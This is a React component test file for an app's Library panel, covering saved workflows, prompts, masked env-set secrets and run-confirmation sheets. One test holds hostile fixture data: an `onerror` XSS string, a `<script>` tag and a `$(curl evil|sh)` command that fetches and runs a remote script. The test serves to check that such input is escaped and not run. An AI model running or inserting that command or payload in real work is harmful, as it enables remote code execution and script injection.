import { act, render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import { createLibraryMock, libraryFixtures, suggestionFixtures } from "../../../mock/library";
import { useUi } from "../../product/state/ui";
import { useWorkspace } from "../../product/state/workspace";
import { LibraryPanel } from "./LibraryPanel";
import { setLibraryApi } from "./api";

const typed = vi.hoisted(() => ({ calls: [] as string[], ok: true }));
const typeIn = (_thread: string, text: string) => { if (typed.ok) typed.calls.push(text); return typed.ok; };

beforeEach(() => {
  typed.calls.length = 0;
  typed.ok = true;
  useWorkspace.setState({ threads: { t1: { id: "t1", project_id: "p1" } as never } });
  useUi.getState().setDraft("t1", "");
});
afterEach(() => { setLibraryApi(null); });

const mount = async (mock = createLibraryMock()) => {
  setLibraryApi(mock);
  const user = userEvent.setup();
  render(<LibraryPanel threadId="t1" typeIntoTerminal={typeIn} />);
  await screen.findByRole("tablist", { name: "Library" });
  return { user, mock };
};
const pickItem = async (user: ReturnType<typeof userEvent.setup>, name: string) => user.click(await screen.findByRole("button", { name: new RegExp(`^${name}`) }));
const personal = async (user: ReturnType<typeof userEvent.setup>) => user.click(await screen.findByRole("tab", { name: /^Personal/ }));

it("draws nothing, and no error, when the library route answers 404", async () => {
  const fetching = vi.fn(async () => new Response(JSON.stringify({ code: "not_found", message: "No such route." }), { status: 404 }));
  vi.stubGlobal("fetch", fetching);
  const { container } = render(<LibraryPanel threadId="t1" typeIntoTerminal={typeIn} />);
  await waitFor(() => expect(fetching).toHaveBeenCalledTimes(1));
  await act(async () => { await Promise.resolve(); });
  expect(container).toBeEmptyDOMElement();
  expect(screen.queryByRole("alert")).toBeNull();
});

it("shows the two tabs with their counts, and what each tab is", async () => {
  const { user } = await mount();
  expect(await screen.findByRole("tab", { name: "From repo · 3" })).toHaveAttribute("aria-selected", "true");
  expect(screen.getByRole("tab", { name: "Personal · 4" })).toBeVisible();
  expect(screen.getByText(/read-only, shared through Git/)).toBeVisible();
  expect(screen.getByRole("heading", { name: "Workflows · 1" })).toBeVisible();
  await personal(user);
  expect(screen.getByText(/Only on this computer/)).toBeVisible();
  expect(screen.getByRole("heading", { name: "Workflows · 2" })).toBeVisible();
  expect(screen.getByRole("heading", { name: "Env sets · 1" })).toBeVisible();
});

it("shows the empty states, each with its new-item action", async () => {
  const { user } = await mount(createLibraryMock({ fixtures: { workflows: [], prompts: [], envSets: [] }, suggestions: { workflows: [], prompts: [], env_sets: [], problems: [] } }));
  expect(screen.getByText("No team items in this repo")).toBeVisible();
  expect(screen.getByRole("button", { name: "New personal item" })).toBeVisible();
  await personal(user);
  expect(screen.getByText("Nothing saved on this computer")).toBeVisible();
});

it("searches the open tab by name, description and text, says how many match, and Escape clears it", async () => {
  const { user } = await mount();
  await personal(user);
  await user.type(screen.getByRole("searchbox", { name: "Search the Library" }), "xargs");
  expect(screen.getByRole("status")).toHaveTextContent("1 of 4 items match “xargs”");
  expect(screen.getByRole("button", { name: /^Prune merged branches/ })).toBeVisible();
  expect(screen.queryByRole("button", { name: /^Test one package/ })).toBeNull();
  await user.keyboard("{Escape}");
  expect(screen.getByRole("button", { name: /^Test one package/ })).toBeVisible();
});

it("reads a repo entry read-only and copies it to Personal without a write to the repository", async () => {
  const { user, mock } = await mount();
  await pickItem(user, "Start dev server");
  expect(screen.getByText("Read-only")).toBeVisible();
  expect(screen.queryByRole("button", { name: "Run…" })).toBeNull();
  expect(screen.queryByRole("button", { name: "Edit" })).toBeNull();
  expect(screen.queryByRole("button", { name: "Delete" })).toBeNull();
  await user.click(screen.getByRole("button", { name: "Copy to Personal" }));
  expect(await screen.findByText(/Copied to Personal\. It is on this computer only/)).toBeVisible();
  expect(mock.writes).toEqual(["workflow.create:Start dev server"]);
  expect(await screen.findByRole("button", { name: /^Start dev server/ })).toBeVisible();
});

it("copies a repo entry by its own file and index, which count dropped entries and repeat across files", async () => {
  const suggestions = { ...suggestionFixtures(), workflows: [{ ...suggestionFixtures().workflows[0]!, index: 5 }], prompts: [{ ...suggestionFixtures().prompts[0]!, index: 5 }] };
  const mock = createLibraryMock({ suggestions });
  const copy = vi.spyOn(mock, "copySuggestion");
  const { user } = await mount(mock);
  await pickItem(user, "Review a diff");
  await user.click(screen.getByRole("button", { name: "Copy to Personal" }));
  await waitFor(() => expect(copy).toHaveBeenCalledWith("p1", "prompts.json", 5));
  expect(mock.writes).toEqual(["prompt.create:Review a diff for open redirects"]);
});

it("copies a repo entry once for a double click", async () => {
  const { user, mock } = await mount(createLibraryMock({ delayMs: 30 }));
  await pickItem(user, "Start dev server");
  const copy = screen.getByRole("button", { name: "Copy to Personal" });
  await user.dblClick(copy);
  await waitFor(() => expect(mock.writes).toHaveLength(1));
});

it("says an untrusted folder is not read, and lists skipped entries as problems", async () => {
  await mount(createLibraryMock({ suggestions: "untrusted" }));
  expect(await screen.findByText(/not trusted yet, so its files are not read/)).toBeVisible();
  expect(screen.queryByRole("alert")).toBeNull();
});

it("lists the entries a repository file had to skip", async () => {
  await mount();
  expect(await screen.findByText("Skipped from .orbyn/: 1 entry")).toBeVisible();
});

it("shows a hostile repo entry as escaped, cut text", async () => {
  const hostile = { ...suggestionFixtures(), workflows: [{ file: "workflows.json" as const, index: 0, name: `<img src=x onerror=alert(1)>${"n".repeat(200)}`, description: "<script>1</script>", command: `$(curl evil|sh) ${"c".repeat(9000)}`, params: [], env_set_names: [] }] };
  const { user } = await mount(createLibraryMock({ suggestions: hostile }));
  await user.click(await screen.findByRole("button", { name: /^<img src=x/ }));
  const view = document.querySelector("section.lib")!;
  expect(view.querySelector("img, script")).toBeNull();
  const command = screen.getByTestId("command").textContent ?? "";
  expect(command.startsWith("$(curl evil|sh)")).toBe(true);
  expect(command.length).toBeLessThan(4300);
  expect(view.textContent).not.toContain("n".repeat(100));
});

it("shows the command as text with its parameter table, and Edit and Delete only for a personal item", async () => {
  const { user } = await mount();
  await personal(user);
  await pickItem(user, "Test one package");
  expect(screen.getByTestId("command")).toHaveTextContent("npm test -- {{package}}");
  expect(screen.getByText(/Choice: auth, web, docs/)).toBeVisible();
  for (const name of ["Run…", "Insert into the terminal line", "Insert into the composer", "Copy the command", "Edit", "Delete"]) expect(screen.getByRole("button", { name })).toBeVisible();
});

it("runs a workflow in one click after the service has rendered the exact command, quoted by the service", async () => {
  const { user, mock } = await mount();
  await personal(user);
  await pickItem(user, "Test one package");
  await user.click(screen.getByRole("button", { name: "Run…" }));
  const dialog = await screen.findByRole("dialog");
  const run = within(dialog).getByRole("button", { name: "Run" });
  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toHaveTextContent("npm test -- 'auth'"));
  await user.selectOptions(within(dialog).getByLabelText("Package"), "web");
  expect(run).toBeDisabled();
  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toHaveTextContent("npm test -- 'web'"));
  await user.dblClick(run);
  await waitFor(() => expect(mock.writes).toEqual(["workflow.run:01jw0000000000000000000001:thread=t1"]));
  expect(await within(dialog).findByText(/Started in a terminal/)).toBeVisible();
});

it("keeps Run off, with the reason, until a required parameter has a value", async () => {
  const fixtures = libraryFixtures();
  fixtures.workflows[0]!.params = [{ name: "package", label: "Package", kind: "text", required: true }];
  const { user, mock } = await mount(createLibraryMock({ fixtures }));
  await personal(user);
  await pickItem(user, "Test one package");
  await user.click(screen.getByRole("button", { name: "Run…" }));
  const dialog = await screen.findByRole("dialog");
  expect(within(dialog).getByText("Enter Package.")).toBeVisible();
  expect(within(dialog).getByText("The text can’t be built until every parameter is valid.")).toBeVisible();
  expect(within(dialog).getByRole("button", { name: "Run" })).toBeDisabled();
  expect(mock.writes).toEqual([]);
});

it("says a folder that is not trusted can’t run it", async () => {
  const { user, mock } = await mount();
  await personal(user);
  await pickItem(user, "Test one package");
  await user.click(screen.getByRole("button", { name: "Run…" }));
  const dialog = await screen.findByRole("dialog");
  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toBeVisible());
  mock.failNext("folder_untrusted");
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  expect(await within(dialog).findByText(/not trusted yet\. Trust it first/)).toBeVisible();
});

it("types a one-line command into the terminal line with no newline, only on the click", async () => {
  const { user } = await mount();
  await personal(user);
  await pickItem(user, "Test one package");
  await user.click(screen.getByRole("button", { name: "Insert into the terminal line" }));
  const dialog = await screen.findByRole("dialog");
  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toBeVisible());
  expect(typed.calls).toEqual([]);
  await user.click(within(dialog).getByRole("button", { name: "Insert into the terminal line" }));
  expect(await within(dialog).findByText(/Press Enter there to run it/)).toBeVisible();
  expect(typed.calls).toEqual(["npm test -- 'auth'"]);
  expect(typed.calls[0]).not.toMatch(/[\r\n]/);
});

it("refuses to type a command of more than one line into the terminal, and offers Run or Copy", async () => {
  const fixtures = libraryFixtures();
  fixtures.workflows[0]!.command = "echo a\necho b";
  fixtures.workflows[0]!.params = [];
  const { user } = await mount(createLibraryMock({ fixtures }));
  await personal(user);
  await pickItem(user, "Test one package");
  await user.click(screen.getByRole("button", { name: "Insert into the terminal line" }));
  const dialog = await screen.findByRole("dialog");
  expect(await within(dialog).findByText(/more than one line/)).toBeVisible();
  expect(within(dialog).getByRole("button", { name: "Insert into the terminal line" })).toBeDisabled();
  expect(typed.calls).toEqual([]);
});

it("says so when no terminal is open, and writes nothing", async () => {
  typed.ok = false;
  const { user } = await mount();
  await personal(user);
  await pickItem(user, "Test one package");
  await user.click(screen.getByRole("button", { name: "Insert into the terminal line" }));
  const dialog = await screen.findByRole("dialog");
  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toBeVisible());
  await user.click(within(dialog).getByRole("button", { name: "Insert into the terminal line" }));
  expect(await within(dialog).findByText(/No terminal is open for this thread/)).toBeVisible();
});

it("inserts a prompt into the composer as editable text after the existing draft, and sends nothing", async () => {
  useUi.getState().setDraft("t1", "Before");
  const { user } = await mount();
  await personal(user);
  await pickItem(user, "Standup summary");
  await user.click(screen.getByRole("button", { name: "Insert into the composer" }));
  const dialog = await screen.findByRole("dialog");
  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toBeVisible());
  await user.click(within(dialog).getByRole("button", { name: "Insert into the composer" }));
  expect(await within(dialog).findByText(/nothing is sent/)).toBeVisible();
  expect(useUi.getState().drafts["t1"]).toBe("Before\nSummarise the commits since 'yesterday' in three lines.");
});

it("never offers to run a prompt, and says a prompt is text", async () => {
  const { user } = await mount();
  await personal(user);
  await pickItem(user, "Standup summary");
  expect(screen.queryByRole("button", { name: /^Run/ })).toBeNull();
  expect(screen.getByText(/A prompt is text\. Orbyn does not run it as a command/)).toBeVisible();
});

it("shows an env set with fixed masks and never a value, a length or a character of one", async () => {
  const mock = createLibraryMock();
  mock.vault.set("01je0000000000000000000001/API_BASE", "https://secret.example");
  const { user } = await mount(mock);
  await personal(user);
  await pickItem(user, "work-laptop");
  const keys = screen.getByRole("list", { name: "Variables" });
  const rows = within(keys).getAllByRole("listitem");
  expect(within(rows[0]!).getByLabelText("A value is set")).toHaveTextContent("••••••••");
  expect(within(rows[1]!).getByText("No value on this computer")).toBeVisible();
  expect(document.body.textContent).not.toContain("secret.example");
  expect(screen.queryByRole("button", { name: /Reveal/ })).toBeNull();
});

it("adds a value through the one-field form and then shows only the mask", async () => {
  const { user, mock } = await mount();
  await personal(user);
  await pickItem(user, "work-laptop");
  await user.click(screen.getByRole("button", { name: "Add value" }));
  await user.type(screen.getByLabelText(/Value for API_TOKEN/), "tok-12345");
  await user.click(screen.getByRole("button", { name: "Save value" }));
  await waitFor(() => expect(mock.writes).toEqual(["key:01je0000000000000000000001:API_TOKEN"]));
  await waitFor(() => expect(within(screen.getByRole("list", { name: "Variables" })).getAllByLabelText("A value is set")).toHaveLength(2));
  expect(document.body.textContent).not.toContain("tok-12345");
});

it("marks a Planned set, keeps names only and offers no value controls", async () => {
  const { user } = await mount(createLibraryMock({ platform: "planned" }));
  await personal(user);
  await pickItem(user, "work-laptop");
  expect(screen.getByText("Planned")).toBeVisible();
  expect(screen.getByText(/Values are not stored on this computer yet/)).toBeVisible();
  expect(screen.queryByRole("button", { name: "Add value" })).toBeNull();
});

it("creates a personal workflow with the problem marked on its field and the text kept", async () => {
  const { user, mock } = await mount();
  await user.click(screen.getByRole("button", { name: "New item" }));
  const dialog = await screen.findByRole("dialog");
  await user.type(within(dialog).getByLabelText("Name"), "Test one package");
  await user.type(within(dialog).getByLabelText("Command"), "npm test -- {{{{pkg}}");
  expect(within(dialog).getByText(/which is not a parameter/)).toBeVisible();
  expect(within(dialog).getByRole("button", { name: "Save" })).toBeDisabled();
  expect(within(dialog).getByText(/already used in Personal/)).toBeVisible();
  await user.clear(within(dialog).getByLabelText("Name"));
  await user.type(within(dialog).getByLabelText("Name"), "Run pkg");
  await user.click(within(dialog).getByRole("button", { name: "Add parameter" }));
  await user.type(within(dialog).getByLabelText("Parameter 1 name"), "pkg");
  expect(within(dialog).getByRole("button", { name: "Save" })).toBeEnabled();
  expect(within(dialog).getByText(/Orbyn writes nothing into your repository/)).toBeVisible();
  await user.click(within(dialog).getByRole("button", { name: "Save" }));
  await waitFor(() => expect(mock.writes).toEqual(["workflow.create:Run pkg"]));
  expect(await screen.findByText("Saved Run pkg to Personal.")).toBeVisible();
});

it("keeps the edits on a conflict and replaces the saved version only after one more confirm", async () => {
  const { user, mock } = await mount();
  await personal(user);
  await pickItem(user, "Test one package");
  await user.click(screen.getByRole("button", { name: "Edit" }));
  const dialog = await screen.findByRole("dialog");
  const description = within(dialog).getByLabelText("Description");
  await user.clear(description);
  await user.type(description, "Mine");
  mock.touch("01jw0000000000000000000001");
  await user.click(within(dialog).getByRole("button", { name: "Save" }));
  expect(await within(dialog).findByText(/changed since you opened it/)).toBeVisible();
  expect(within(dialog).getByLabelText("Description")).toHaveValue("Mine");
  expect(mock.writes).toEqual([]);
  await user.click(within(dialog).getByRole("button", { name: "Save mine" }));
  const confirm = (await screen.findAllByRole("dialog")).at(-1)!;
  expect(within(confirm).getByText(/replace what was saved/)).toBeVisible();
  await user.click(within(confirm).getByRole("button", { name: "Replace it" }));
  await waitFor(() => expect(mock.writes).toEqual(["workflow.update:Test one package"]));
});

it("deletes after one confirm with Cancel focused", async () => {
  const { user, mock } = await mount();
  await personal(user);
  await pickItem(user, "Prune merged branches");
  await user.click(screen.getByRole("button", { name: "Delete" }));
  const dialog = await screen.findByRole("dialog");
  expect(within(dialog).getByRole("button", { name: "Cancel" })).toHaveFocus();
  await user.click(within(dialog).getByRole("button", { name: "Delete" }));
  await waitFor(() => expect(mock.writes).toEqual(["workflow.delete:01jw0000000000000000000002"]));
});

it("uses Map-safe lookups: a hostile item id is just text", async () => {
  const fixtures = libraryFixtures();
  fixtures.workflows[0]!.id = "__proto__";
  fixtures.workflows[0]!.name = "constructor";
  const { user } = await mount(createLibraryMock({ fixtures }));
  await personal(user);
  await pickItem(user, "constructor");
  expect(screen.getByTestId("command")).toBeVisible();
});

// A saved workflow that lists the work-laptop set: its run needs the env_values grant.
const SET = "01je0000000000000000000001";
const WF = "01jw0000000000000000000001";
const withSet = () => { const fixtures = libraryFixtures(); fixtures.workflows[0]!.env_set_ids = [SET]; fixtures.workflows[0]!.params = []; fixtures.workflows[0]!.command = "npm test"; return fixtures; };
const openRun = async (user: ReturnType<typeof userEvent.setup>, name = "Test one package") => {
  await personal(user);
  await pickItem(user, name);
  await user.click(screen.getByRole("button", { name: "Run…" }));
  const dialog = await screen.findByRole("dialog");
  await waitFor(() => expect(within(dialog).getByTestId("rendered")).toBeVisible());
  return dialog;
};
const sheet = async () => (await screen.findByRole("button", { name: "Run anyway" })).closest("dialog")!;

it("asks for a confirm sheet on 409 confirm_required: the grants in words and each set's name with its key names, never a value", async () => {
  const mock = createLibraryMock({ fixtures: withSet() });
  mock.vault.set(`${SET}/API_BASE`, "https://secret.example");
  const run = vi.spyOn(mock, "runWorkflow");
  const { user } = await mount(mock);
  const dialog = await openRun(user);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  const confirm = await sheet();
  expect(confirm.querySelector("h2")?.textContent).toBe("Run “Test one package”?");
  expect(within(confirm).getByText(/saved values of these env sets go into the command’s environment/)).toBeVisible();
  expect(within(within(confirm).getByRole("list", { name: "Env sets applied" })).getByText("work-laptop")).toBeVisible();
  const keys = within(confirm).getByRole("list", { name: "Keys in work-laptop" });
  expect(within(keys).getByText("API_BASE")).toBeVisible();
  expect(within(keys).getByText("API_TOKEN")).toBeVisible();
  expect(confirm.textContent).not.toContain("secret.example");
  expect(confirm.textContent).not.toContain("https://secret.example");
  expect(within(confirm).getByRole("button", { name: "Cancel" })).toHaveFocus();
  expect(run).toHaveBeenCalledTimes(1);
  expect(run.mock.calls[0]![3] ?? []).toEqual([]);
  expect(mock.writes).toEqual([]);
});

it("resends the same run with exactly the shown grants once per click, however many times it is clicked", async () => {
  const mock = createLibraryMock({ fixtures: withSet(), delayMs: 20 });
  const run = vi.spyOn(mock, "runWorkflow");
  const { user } = await mount(mock);
  const dialog = await openRun(user);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  const confirm = await sheet();
  await user.dblClick(within(confirm).getByRole("button", { name: "Run anyway" }));
  await waitFor(() => expect(mock.writes).toEqual([`workflow.run:${WF}:thread=t1:ack=env_values`]));
  expect(run).toHaveBeenCalledTimes(2);
  expect(run.mock.calls[1]).toEqual([WF, {}, { thread_id: "t1" }, ["env_values"]]);
  expect(await within(dialog).findByText(/Started in a terminal/)).toBeVisible();
});

it("sends nothing when the sheet is cancelled, and the next run asks again", async () => {
  const mock = createLibraryMock({ fixtures: withSet() });
  const run = vi.spyOn(mock, "runWorkflow");
  const { user } = await mount(mock);
  const dialog = await openRun(user);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  await user.click(within(await sheet()).getByRole("button", { name: "Cancel" }));
  expect(run).toHaveBeenCalledTimes(1);
  expect(mock.writes).toEqual([]);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  expect(within(await sheet()).getByRole("button", { name: "Run anyway" })).toBeVisible();
  expect(run).toHaveBeenCalledTimes(2);
  expect(run.mock.calls[1]![3] ?? []).toEqual([]);
});

it("never remembers an ack: a workflow that lists a set asks on every run", async () => {
  const mock = createLibraryMock({ fixtures: withSet() });
  const run = vi.spyOn(mock, "runWorkflow");
  const { user } = await mount(mock);
  for (let turn = 0; turn < 2; turn += 1) {
    const dialog = await openRun(user, turn === 0 ? "Test one package" : "Test one package");
    await user.click(within(dialog).getByRole("button", { name: "Run" }));
    await user.click(within(await sheet()).getByRole("button", { name: "Run anyway" }));
    await within(dialog).findByText(/Started in a terminal/);
    await user.click(within(dialog).getByRole("button", { name: "Close" }));
  }
  expect(run.mock.calls.map((call) => call[3] ?? [])).toEqual([[], ["env_values"], [], ["env_values"]]);
});

it("lists both grants for an imported workflow with a set, and asks again after an edit to its command, but not for a rename", async () => {
  const fixtures = withSet();
  fixtures.workflows[0]!.env_set_ids = [];
  Object.assign(fixtures.workflows[0]!, { source: "import", needs_ack: true });
  const mock = createLibraryMock({ fixtures });
  const run = vi.spyOn(mock, "runWorkflow");
  const { user } = await mount(mock);
  let dialog = await openRun(user);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  let confirm = await sheet();
  expect(within(confirm).getByText(/came from a file, a repository or a shared link/)).toBeVisible();
  expect(within(confirm).queryByRole("list", { name: "Env sets applied" })).toBeNull();
  await user.click(within(confirm).getByRole("button", { name: "Run anyway" }));
  await within(dialog).findByText(/Started in a terminal/);
  await user.click(within(dialog).getByRole("button", { name: "Close" }));
  // Acknowledged on the service: the next run needs no sheet.
  dialog = await openRun(user);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  await within(dialog).findByText(/Started in a terminal/);
  expect(run.mock.calls.map((call) => call[3] ?? [])).toEqual([[], ["untrusted_source"], []]);
  await user.click(within(dialog).getByRole("button", { name: "Close" }));
  // An edit to the command drops it: the sheet comes back.
  const one = (await mock.workflows())[0]!;
  await mock.updateWorkflow(one.id, { name: one.name, description: one.description, command: "npm test --bail", params: [], env_set_ids: [] }, one.revision);
  dialog = await openRun(user);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  confirm = await sheet();
  expect(within(confirm).getByRole("button", { name: "Run anyway" })).toBeVisible();
});

it("says a confirm this app cannot show started nothing, instead of sending an empty ack", async () => {
  const mock = createLibraryMock();
  mock.runWorkflow = async () => { const { ApiFailure } = await import("../../api/client"); throw new ApiFailure("confirm_required", "Confirm.", 409, { grants: [] }); };
  const { user } = await mount(mock);
  const dialog = await openRun(user);
  await user.click(within(dialog).getByRole("button", { name: "Run" }));
  expect(await within(dialog).findByText(/needs a confirmation this app can’t show, so nothing was started/)).toBeVisible();
  expect(screen.getAllByRole("dialog")).toHaveLength(1);
});

it("shows an Imported, From repo or Shared pill for a non-local entry and none for a local one or an unknown word", async () => {
  const fixtures = libraryFixtures();
  Object.assign(fixtures.workflows[0]!, { source: "import" });
  Object.assign(fixtures.workflows[1]!, { source: "shared" });
  Object.assign(fixtures.prompts[0]!, { source: "repo" });
  const { user } = await mount(createLibraryMock({ fixtures }));
  await personal(user);
  await pickItem(user, "Test one package");
  expect(screen.getByRole("button", { name: /^Test one package\s*Imported · / })).toBeVisible();
  expect(screen.getByRole("heading", { name: /^Test one package\s*Imported$/ })).toBeVisible();
  await pickItem(user, "Prune merged branches");
  expect(screen.getByRole("heading", { name: /^Prune merged branches\s*Shared$/ })).toBeVisible();
  await pickItem(user, "Standup summary");
  expect(screen.getByRole("heading", { name: /^Standup summary\s*From repo$/ })).toBeVisible();
});

it("shows no pill for a local entry or a source word it does not know, and never the raw word", async () => {
  const fixtures = libraryFixtures();
  Object.assign(fixtures.workflows[1]!, { source: "<b>weird</b>" });
  const { user } = await mount(createLibraryMock({ fixtures }));
  await personal(user);
  await pickItem(user, "Test one package");
  expect(screen.getByRole("heading", { name: "Test one package" })).toBeVisible();
  await pickItem(user, "Prune merged branches");
  expect(screen.getByRole("heading", { name: "Prune merged branches" })).toBeVisible();
  expect(document.body.textContent).not.toContain("weird");
});

it("copies a repo workflow as a From repo entry that names the sets it resolved", async () => {
  const suggestions = suggestionFixtures();
  suggestions.workflows[0]!.env_set_names = ["work-laptop"];
  const { user } = await mount(createLibraryMock({ suggestions }));
  await pickItem(user, "Start dev server");
  expect(screen.getByText(/Environment: work-laptop/)).toBeVisible();
  await user.click(screen.getByRole("button", { name: "Copy to Personal" }));
  // The copy switches to the Personal tab when it lands; pick the row only after, or the click races the switch.
  await screen.findByText(/Copied to Personal/, undefined, { timeout: 10000 });
  await pickItem(user, "Start dev server");
  expect(await screen.findByRole("heading", { name: /^Start dev server\s*From repo$/ }, { timeout: 10000 })).toBeVisible();
  expect(screen.getByText(/Its next run asks you to confirm first/)).toBeVisible();
}, 20000);

it("treats a keychain_unavailable on a value save as the Planned note, with the service's words and no error", async () => {
  const mock = createLibraryMock();
  const { user } = await mount(mock);
  await personal(user);
  await pickItem(user, "work-laptop");
  await user.click(screen.getByRole("button", { name: "Add value" }));
  mock.failNext("keychain_unavailable");
  await user.type(screen.getByLabelText(/Value for API_TOKEN/), "tok-12345");
  await user.click(screen.getByRole("button", { name: "Save value" }));
  expect(await screen.findByText(/There is no usable keychain on this computer yet, so values cannot be saved/)).toBeVisible();
  expect(screen.queryByRole("alert")).toBeNull();
  expect(screen.queryByLabelText(/Value for API_TOKEN/)).toBeNull();
  expect(document.body.textContent).not.toContain("tok-12345");
  expect(mock.writes).toEqual([]);
});
